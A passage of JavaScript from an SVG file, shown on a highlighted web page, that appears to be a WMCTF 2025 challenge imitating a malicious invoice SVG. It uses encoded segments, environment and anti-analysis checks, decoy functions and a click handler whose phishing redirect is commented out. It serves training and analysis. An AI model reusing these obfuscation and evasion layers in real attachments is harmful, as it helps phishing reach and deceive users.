class="string">&#x27;4oyM4p2h77iP4p2j4oyM4p2d77iL4p2c4oyI4p2g77iN4p2a77iP4p2b4oyL4p2Y&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="string">&#x27;4p2Z77iM4p2X77iO4p2W77iM4p2V77iK4p2U77iL4p2T77iM4p2S77iN4p2R&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="string">&#x27;4p2Q77iL4p2P77iO4p2O77iM4p2N77iK4p2M77iL4p2L77iM4p2K77iN4p2J&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="string">&#x27;4p2I77iL4p2H77iO4p2G77iM4p2F77iK4p2E77iL4p2D77iM4p2C77iN4p2B&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="string">&#x27;4p2A77iL4pyx77iO4py977iM4py877iK4py777iL4py677iM4py577iN4py4&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      ];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="comment">// Layer 3: Environmental validation with complex checks</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> envValidation = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> checks = [</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">typeof</span> <span class="variable language_">window</span> !== <span class="string">&#x27;undefined&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">typeof</span> <span class="variable language_">document</span> !== <span class="string">&#x27;undefined&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          navigator.<span class="property">userAgent</span>.<span class="property">length</span> &gt; <span class="number">10</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          screen.<span class="property">width</span> &gt; <span class="number">0</span> &amp;&amp; screen.<span class="property">height</span> &gt; <span class="number">0</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="title class_">Date</span>.<span class="title function_">now</span>() &gt; <span class="number">1700000000000</span>, <span class="comment">// After 2023</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="title class_">Math</span>.<span class="title function_">abs</span>(<span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTimezoneOffset</span>()) &lt; <span class="number">1440</span>, <span class="comment">// Valid timezone</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          entropy.<span class="property">length</span> === <span class="number">7</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          globalSeed !== <span class="number">0x5A4D</span> <span class="comment">// Should be modified by fingerprinting</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        ];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> validCount = checks.<span class="title function_">filter</span>(<span class="title class_">Boolean</span>).<span class="property">length</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">return</span> validCount &gt;= <span class="number">6</span>; <span class="comment">// Require most checks to pass</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="comment">// Layer 4: Steganographic data hidden in mathematical sequences</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> fibSequence = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">21</span>,<span class="number">34</span>,<span class="number">55</span>,<span class="number">89</span>,<span class="number">144</span>,<span class="number">233</span>,<span class="number">377</span>,<span class="number">610</span>,<span class="number">987</span>,<span class="number">1597</span>,<span class="number">2584</span>];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> primeSequence = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">61</span>];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="comment">// Hidden data in sequence differences (steganography)</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> hiddenIndices = [];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; fibSequence.<span class="property">length</span>; i++) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> diff = fibSequence[i] - fibSequence[i-<span class="number">1</span>];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">if</span> (diff &gt; <span class="number">0</span> &amp;&amp; diff &lt; polymorphicData.<span class="property">length</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          hiddenIndices.<span class="title function_">push</span>(diff % polymorphicData.<span class="property">length</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> generateDynamicKey = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> timeComponent = (<span class="title class_">Date</span>.<span class="title function_">now</span>() % <span class="number">86400000</span>).<span class="title function_">toString</span>(<span class="number">36</span>); <span class="comment">// Daily changing component</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> envComponent = (globalSeed ^ <span class="number">0xDEADBEEF</span>).<span class="title function_">toString</span>(<span class="number">36</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> browserComponent = (navigator.<span class="property">userAgent</span>.<span class="property">length</span> * screen.<span class="property">colorDepth</span>).<span class="title function_">toString</span>(<span class="number">36</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> staticKey = <span class="string">&#x27;WMCTF_2025_SVG_ANALYSIS&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">return</span> staticKey;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> decryptionPipeline = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">if</span> (!<span class="title function_">envValidation</span>()) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Environment validation failed&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">return</span> <span class="literal">null</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">try</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">var</span> dynamicKey = <span class="title function_">generateDynamicKey</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">var</span> realDataIndices = [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]; <span class="comment">// Skip decoy data</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">var</span> encryptedParts = [];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; realDataIndices.<span class="property">length</span>; i++) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> idx = realDataIndices[i];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">if</span> (idx &lt; polymorphicData.<span class="property">length</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              encryptedParts.<span class="title function_">push</span>(polymorphicData[idx]);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Found encrypted parts:&#x27;</span>, encryptedParts.<span class="property">length</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">var</span> stage1Results = [];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; encryptedParts.<span class="property">length</span>; j++) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> part = encryptedParts[j];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="comment">// Convert Unicode escape sequences to characters</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> decoded = part.<span class="title function_">replace</span>(<span class="regexp">/4oyM|4p2[a-zA-Z0-9]|77i[a-zA-Z0-9]/g</span>, <span class="keyword">function</span>(<span class="params">match</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              <span class="keyword">var</span> charMap = &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="string">&#x27;4p2V&#x27;</span>: <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;4p2P&#x27;</span>: <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;4p2F&#x27;</span>: <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;4p2g&#x27;</span>: <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;4p2a&#x27;</span>: <span class="string">&#x27;P&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="string">&#x27;4p2c&#x27;</span>: <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;4oyI&#x27;</span>: <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;4p2T&#x27;</span>: <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;77iP&#x27;</span>: <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;4p2S&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="string">&#x27;4p2L&#x27;</span>: <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;4p2D&#x27;</span>: <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;4p2O&#x27;</span>: <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;4p2M&#x27;</span>: <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;4p2d&#x27;</span>: <span class="string">&#x27;f&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="string">&#x27;77iO&#x27;</span>: <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;4p2b&#x27;</span>: <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;4p2Z&#x27;</span>: <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;4oyL&#x27;</span>: <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;77iM&#x27;</span>: <span class="string">&#x27;i&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="string">&#x27;4p2J&#x27;</span>: <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;4p2B&#x27;</span>: <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;4p2R&#x27;</span>: <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;4p2h&#x27;</span>: <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;4p2X&#x27;</span>: <span class="string">&#x27;n&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="string">&#x27;4p2H&#x27;</span>: <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;4pyx&#x27;</span>: <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;4p2I&#x27;</span>: <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;4p2A&#x27;</span>: <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;4p2C&#x27;</span>: <span class="string">&#x27;s&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="string">&#x27;4p2Y&#x27;</span>: <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;4p2j&#x27;</span>: <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;77iK&#x27;</span>: <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;4p2U&#x27;</span>: <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;4p2K&#x27;</span>: <span class="string">&#x27;t&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="string">&#x27;4p2N&#x27;</span>: <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;4p2E&#x27;</span>: <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;4oyM&#x27;</span>: <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;77iL&#x27;</span>: <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;4py9&#x27;</span>: <span class="string">&#x27;&#125;&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="string">&#x27;77iN&#x27;</span>: <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;4p2W&#x27;</span>: <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;4p2Q&#x27;</span>: <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;4p2G&#x27;</span>: <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;4py8&#x27;</span>: <span class="string">&#x27;!&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="string">&#x27;4py7&#x27;</span>: <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;4py6&#x27;</span>: <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;4py5&#x27;</span>: <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;4py4&#x27;</span>: <span class="string">&#x27;!&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              <span class="keyword">return</span> charMap[match] || <span class="string">&#x27;&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#125;);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            stage1Results.<span class="title function_">push</span>(decoded);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">var</span> combined = stage1Results.<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Stage 1 result:&#x27;</span>, combined);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">var</span> finalResult = <span class="string">&#x27;&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">for</span> (<span class="keyword">var</span> k = <span class="number">0</span>; k &lt; combined.<span class="property">length</span>; k++) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> char = combined.<span class="title function_">charCodeAt</span>(k);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> keyChar = dynamicKey.<span class="title function_">charCodeAt</span>(k % dynamicKey.<span class="property">length</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> transformed = char ^ (keyChar % <span class="number">32</span>); <span class="comment">// Reduced XOR for readability</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            finalResult += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(transformed);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">return</span> finalResult;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125; <span class="keyword">catch</span> (error) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Decryption failed:&#x27;</span>, error.<span class="property">message</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">return</span> <span class="literal">null</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> mathematicalObfuscation = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> phi = <span class="number">1.618033988749895</span>; <span class="comment">// Golden ratio</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> pi = <span class="number">3.141592653589793</span>;   <span class="comment">// Pi</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> e = <span class="number">2.718281828459045</span>;    <span class="comment">// Euler&#x27;s number</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> mathKey = <span class="title class_">Math</span>.<span class="title function_">floor</span>(phi * <span class="number">1000</span>) + <span class="title class_">Math</span>.<span class="title function_">floor</span>(pi * <span class="number">1000</span>) + <span class="title class_">Math</span>.<span class="title function_">floor</span>(e * <span class="number">1000</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">       </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="variable language_">window</span>.<span class="property">mathSegments</span> = [</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="title function_">btoa</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(mathKey % <span class="number">256</span>) + segments[<span class="number">0</span>]),</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="title function_">btoa</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((mathKey * <span class="number">2</span>) % <span class="number">256</span>) + segments[<span class="number">1</span>]),</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="title function_">btoa</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((mathKey * <span class="number">3</span>) % <span class="number">256</span>) + segments[<span class="number">2</span>]),</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="title function_">btoa</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((mathKey * <span class="number">4</span>) % <span class="number">256</span>) + segments[<span class="number">3</span>]),</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="title function_">btoa</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((mathKey * <span class="number">5</span>) % <span class="number">256</span>) + segments[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        ];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">return</span> mathKey;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> mathKey = <span class="title function_">mathematicalObfuscation</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">if</span> (detectionBypass &amp;&amp; !jXKuzdDMGk &amp;&amp; <span class="title function_">verification</span>()) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="title function_">constructPayload</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="variable language_">window</span>.<span class="property">extractFlag</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">try</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">hiddenData</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              <span class="keyword">var</span> encoded = <span class="title function_">atob</span>(<span class="variable language_">window</span>.<span class="property">hiddenData</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              <span class="keyword">var</span> key = <span class="string">&#x27;WMCTF2025&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              <span class="keyword">var</span> decoded = <span class="string">&#x27;&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; encoded.<span class="property">length</span>; i++) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                decoded += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                  encoded.<span class="title function_">charCodeAt</span>(i) ^ key.<span class="title function_">charCodeAt</span>(i % key.<span class="property">length</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                );</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Extracted flag:&#x27;</span>, decoded);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              <span class="keyword">return</span> decoded;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          &#125; <span class="keyword">catch</span> (e) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Flag extraction failed&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;, <span class="number">1000</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="comment">// Decoy functions to confuse analysis</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">function</span> <span class="title function_">generateFakeTraffic</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> fakeUrls = [</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="string">&#x27;https://api.example.com/data&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="string">&#x27;https://cdn.jsdelivr.net/npm/package&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="string">&#x27;https://fonts.googleapis.com/css&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    ];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// These would normally make requests but are disabled for CTF</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">function</span> <span class="title function_">createFakeElements</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// Create invisible elements with misleading data</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> hiddenDiv = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    hiddenDiv.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    hiddenDiv.<span class="property">innerHTML</span> = <span class="title function_">atob</span>(<span class="string">&#x27;RmFrZSBmbGFnOiBXTUNURntub3RfdGhlX3JlYWxfZmxhZ30=&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(hiddenDiv);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="comment">// Initialize decoy functions</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="title function_">generateFakeTraffic</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="title function_">createFakeElements</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="comment">// Add click handler for the invoice</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">if</span> (detectionBypass &amp;&amp; !jXKuzdDMGk) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="comment">// This would normally redirect to phishing site</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="comment">// window.location.href = &#x27;https://fake-payment-portal.com&#x27;;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Invoice clicked - in real attack, this would redirect to phishing site&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">]]&gt;</span><span class="tag">&lt;/<span 